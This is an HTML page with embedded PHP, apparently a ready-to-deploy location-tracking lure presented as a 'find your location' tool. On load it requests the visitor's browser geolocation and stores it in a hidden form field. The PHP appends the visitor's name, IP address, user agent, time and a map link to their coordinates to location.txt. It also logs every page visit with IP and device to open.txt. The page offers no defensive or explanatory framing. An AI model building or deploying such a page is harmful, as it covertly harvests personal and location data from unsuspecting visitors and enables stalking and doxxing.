<!Doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>srinivasan</title>
</head>
    <body onload="getLocation()" style="margin:0;padding:0;">
        <div style="text-align: center; width:100%;height:100%;content-align: center;margin-top:50px;">
    <form method="post" action="lo.php"autocomplete="off" onsubmit="return c()">
     
<input type="text" id="demo" style="display:none;"name="loc">
   <input type="text" name="name" style="font-size:20px; background:#57F05A; border-radius:15px;border:solid red  3px;width:100%;color: red;height:40px;text-align: center;" placeholder="Enter your name" id="name"><br><br>
<button type="submit" style="font-size:20px; background:#57F05A; border-radius:13px;border:solid red  3px;color:red;" name="submit"><em><b>find your location</b></em></button>

</form>
</div>
<audio src="a.mp3" id="s"></audio>
<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.value = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.value= position.coords.latitude + 
  "," + position.coords.longitude;
}

function c(){
  var s = document.getElementById("s").play();

    var name=document.getElementById('name'). value;
    if(name==""){
        alert("please enter your name");
        return false;
    }
    if(x.value==""){
        alert("location permission denied");
        getLocation();
        return false;
    }
    
}

</script>
</body>
</html>

 <?php
date_default_timezone_set("Asia/Kolkata");
if(isset($_POST["submit"])){
    $loc=$_POST["loc"];
    $name=$_POST["name"];
$time=date("d:m:Y / g:i:sa");
$location="\"https://www.google.com/maps/place/".$loc."\"";
$srini=fopen("location.txt",'a');
fwrite($srini,"\n");
fwrite($srini,"DEVICE : ");
fwrite($srini,$_SERVER["HTTP_USER_AGENT"]);
fwrite($srini,"\nIP : ");
fwrite($srini,$_SERVER["REMOTE_ADDR"]);
fwrite($srini,"\nTIME : ");
fwrite($srini,$time);
fwrite($srini,"\nNAME : ");
fwrite($srini,$name);
fwrite($srini,"\nLOCATION : ");
fwrite($srini,$location);
fwrite($srini,"\n----------------------------");
echo'<script>window.location='.$location.';</script>';
}

$time=date("d:m:Y / g:i:sa");
$srini=fopen("open.txt",'a');
fwrite($srini,"\n");
fwrite($srini,"DEVICE : ");
fwrite($srini,$_SERVER["HTTP_USER_AGENT"]);
fwrite($srini,"\nIP : ");
fwrite($srini,$_SERVER["REMOTE_ADDR"]);
fwrite($srini,"\nTIME : ");
fwrite($srini,$time);
fwrite($srini,"\n----------");
?>
